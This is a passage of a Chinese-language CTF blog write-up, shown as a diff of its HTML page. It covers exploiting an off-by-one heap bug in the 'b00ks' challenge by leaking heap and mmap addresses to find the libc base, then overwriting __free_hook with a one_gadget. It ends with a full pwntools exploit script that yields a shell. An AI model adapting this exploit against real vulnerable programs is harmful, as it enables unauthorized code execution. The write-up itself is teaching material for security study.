+<p><img src="/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/.png" alt="image-20260220195401218"></p>
+<p>我们创建两本书，malloc 共申请了6次，但这里只有4个堆块。可以看到前三个堆块就是我们的 book1，而 book2 申请的两个超大内存并不在堆区域，只有 book2 结构体存储的块。</p>
+<p>我们来看 book2 结构体，很明显，size 部分 0x00000000001e8480 正是我们申请的 2000000字节内存大小，而 0x00007ffff7a17010 和 0x00007ffff782e010 则是我们申请的name和description内存区域。</p>
+<p><img src="/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/1.png" alt="image-20260220200044985"></p>
+<p>我们通过 vmmap 可以更清晰的看到 mmap 分配的内存。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap 区域: 0x7ffff782e000</span><br><span class="line">libc 基址: 0x7ffff7c00000</span><br><span class="line">差值 = 0x7ffff782e000 - 0x7ffff7c00000 = -0x3d2000</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\WH\Desktop\Blog\source\images\26-02-14-堆中的off-by-one\mmap2.png" alt="mmap2"></p>
+<p>下面验证一下 mmap 分配的内存与 libc 之间的偏移是否固定。</p>
+<blockquote>
+<p>为方便调试，gdb默认关闭ASLR，我们可以通过<code>set disable-randomization off</code>开启ASLR</p>
+</blockquote>
+<p><img src="/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/mmap3.png" alt="image-20260220203056482"></p>
+<p>计算可知，偏移都是0x3d2000，确实固定。</p>
+<p>接下来泄露 mmap。根据上面的调试，我们可以发现 mmap 分配内存的地址存储在第四个chunk里。之前我们泄露的堆指针派上了用场，由于堆块是邻接的，于是我们就可以计算出那个堆指针相对于存储mmap地址的地址的偏移，再通过 editbook 将这个新地址读取到我们伪造的 book1 结构体 *name 和 *description 部分，然后 printbook 就会将两个地址输出（其实只需要一个地址，只是占位用），通过输出即可推知 libc 基址。</p>
+<h3 id="（三）布置-free-hook"><a href="#（三）布置-free-hook" class="headerlink" title="（三）布置 free_hook"></a>（三）布置 free_hook</h3><p><code>__free_hook</code> 是 glibc 动态链接库中的一个<em>全局函数指针变量</em>，用于调试和拦截 <code>free</code> 函数的调用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc 源码中的定义 (malloc/malloc.c)</span></span><br><span class="line"><span class="type">void</span> (*__free_hook) (<span class="type">void</span> *__ptr, <span class="type">const</span> <span class="type">void</span> *__caller) = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
+
+<p>具体来说 free 大致执行了这样一个过程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// glibc 源码简化版</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *mem)</span> &#123;</span><br><span class="line">    <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查 __free_hook 是否被设置</span></span><br><span class="line">    hook = __free_hook;</span><br><span class="line">    <span class="keyword">if</span> (hook != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果设置了 hook，调用它而不是正常的 free</span></span><br><span class="line">        (*hook)(mem, RETURN_ADDRESS);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正常的 free 逻辑</span></span><br><span class="line">    _int_free(mem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意，在 glibc 2.34+ hook 被移除 &#x2F; 不再调用，此方法无效。</p>
+<p>整体漏洞利用示意图如下：</p>
+<p><img src="/images/26-02-17-%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/%E8%AF%A6%E8%A7%A33.png" alt="image-20260223013557894"></p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    io.readuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">    io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(des_size))</span><br><span class="line">    io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">id</span>):</span><br><span class="line">        book_id = <span class="built_in">int</span>(io.readline()[:-<span class="number">1</span>])</span><br><span class="line">        io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">        book_name = io.readline()[:-<span class="number">1</span>]</span><br><span class="line">        io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">        book_des = io.readline()[:-<span class="number">1</span>]</span><br><span class="line">        io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">        book_author = io.readline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inputname</span>(<span class="params">name</span>):</span><br><span class="line">    io.readuntil(<span class="string">b&quot;Enter author name: &quot;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">    io.readuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id, new_des</span>):</span><br><span class="line">    io.readuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    io.writeline(<span class="built_in">str</span>(book_id))</span><br><span class="line">    io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.readuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line"></span><br><span class="line">inputname(<span class="string">&quot;A&quot;</span> * <span class="number">32</span>) <span class="comment"># input author name</span></span><br><span class="line">createbook(<span class="number">64</span>, <span class="string">&quot;book1&quot;</span>, <span class="number">32</span>, <span class="string">&quot;book1&quot;</span>) <span class="comment"># create book1</span></span><br><span class="line">createbook(<span class="number">2000000</span>, <span class="string">&quot;book2&quot;</span>, <span class="number">2000000</span>, <span class="string">&quot;book2&quot;</span>) <span class="comment"># create book2</span></span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>) <span class="comment"># print book1</span></span><br><span class="line">book1_addr = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span> + <span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">editbook(book_id_1, payload)</span><br><span class="line">changename(<span class="string">&quot;A&quot;</span> * <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book2 name addr:&quot;</span> + <span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line">log.success(<span class="string">&quot;book2 des addr:&quot;</span> + <span class="built_in">hex</span>(book2_des_addr))</span><br><span class="line">libc_base = book2_name_addr + <span class="number">0x3d2000</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xef52b</span>   <span class="comment">#0x583ec 0x583f3 0xef4ce 0xef52b </span></span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">editbook(<span class="number">1</span>, p64(free_hook) * <span class="number">2</span>)</span><br><span class="line">editbook(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/heap-overflow/" rel="tag"># heap-overflow</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/02/09/2026-02-09-ScrabASM/" rel="prev" title="CTF题解：ScrabASM">
+                  <i class="fa fa-angle-left"></i> CTF题解：ScrabASM
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder"></span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
